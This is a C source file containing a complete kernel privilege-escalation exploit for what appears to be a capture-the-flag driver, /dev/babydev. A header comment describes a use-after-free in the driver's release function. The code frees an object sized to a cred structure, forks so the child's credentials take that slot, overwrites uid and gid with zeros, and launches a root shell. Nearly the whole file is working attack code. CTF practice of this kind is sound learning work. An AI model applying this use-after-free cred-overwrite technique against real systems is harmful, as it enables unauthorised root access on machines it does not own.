/*
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x0)
kernel: 4.4.72

babyrelease kfree(babydev_struct.device_buf) doesn't set pointer to NULL -> UAF
babyioctl kmalloc another object within command==0x10001
exp: 
1.use babyioctl modify babydev_struct.device_buf_len to cred struct size then free it 
(freed obj in kmem_cache_cpu->freelist which is FILO)
2.fork one process to kmalloc the freed object
3.babywrite to set uid and gid of cred to 0
*/

// #include "libLian.h"
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/wait.h>
#include<sys/stat.h>


void get_shell() {
    if (getuid() == 0) {
        system("/bin/sh");
        exit(0);
    }
}

int main() {
    int fd1, fd2, fd3;
    fd1 = open("/dev/babydev", O_RDWR); // device1
    fd2 = open("/dev/babydev", O_RDWR); // device2
    ioctl(fd2, 0x10001, 0xA8); // babyioctl
    close(fd2); // free device2 (now fd1 use device2's freed object)

    fd3 = fork();
    if (fd3 < 0) {
        printf("fork error\n");
        exit(-1);
    } else if (fd3 == 0) {
        char cred[0x20] = {0}; // cred all 0
        write(fd1, cred, 0x20); // babywrite UAF
        get_shell();
    } else {
        wait(NULL);
    }

    return 0;
}
